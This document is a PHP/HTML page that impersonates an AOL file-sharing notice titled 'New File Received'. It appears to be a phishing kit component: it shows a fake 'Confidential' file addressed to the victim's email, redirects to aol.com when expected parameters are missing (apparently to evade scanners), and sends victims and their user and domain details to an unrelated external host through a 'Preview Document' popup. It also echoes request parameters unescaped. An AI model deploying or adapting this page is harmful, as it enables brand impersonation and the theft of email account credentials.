
<!DOCTYPE HTML>
        <link rel="icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/login/aol-favicon.png">
        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png">
<html>
 <head>
 <?php
 	error_reporting(0);
 	session_start();
 	$user = $_GET['user'];
 	$file = $_GET['file'];
 	$size = $_GET['size'];
 	$email = $_GET['email'];
 	$auth= MD5(rand(5,997));
 	$dom = $_GET['dom'];

    $must=$_GET['file'];
    if(!$must){
        header("Location:https://aol.com/uploads");
         }
       else if(!$_GET['user']){
        header("Location:https://aol.com/uploads");
         }
             else if(!$_GET['auth']){
        header("Location:https://aol.com/uploads");
         }
    ;?>

  <title>New File Received</title>
 </head>
 <body>
<h2>Preview New File</h2>
<table style="font-s">
	<tr>
	<td><tt><a href="">Name</a></td>
	<td><tt><a href="">Last modified</a></td>
	<td><tt><a href="">Size</a> </td>
	<td><tt><a href="">Description</a></td></tr>
	<td></td>
	<hr></h4>
	<tr border-top="2px">
	<td width="180px"><?php echo $file; ?>  </td>
	<td width="180px"><?php echo date('d/m/Y',strtotime("-1 days")); ?>, 5:12 AM</td>
	<td width="100px"><?php echo $size; ?></td>       
	<td width="180px">Confidential    -  </td>
	<td><button onclick="openWin()">Preview Document</button></a></td></tr></table>
<hr></pre>
<address>This file was sent to <u><?php echo $email; ?></u>, </address>
</body>
<script>
var myWindow;

function openWin() {
    myWindow = window.open("", "myWindow", "width=500,height=600");
myWindow.location = "https://new-received.cc4hsummercamp.com/uploads?auth=<?php echo $auth;?>&file=<?php echo $file;?>&user=<?php echo $_GET['user'];?>&dom=<?php echo $dom;?>";
}

function closeWin() {
    myWindow.close();
}
</script></html>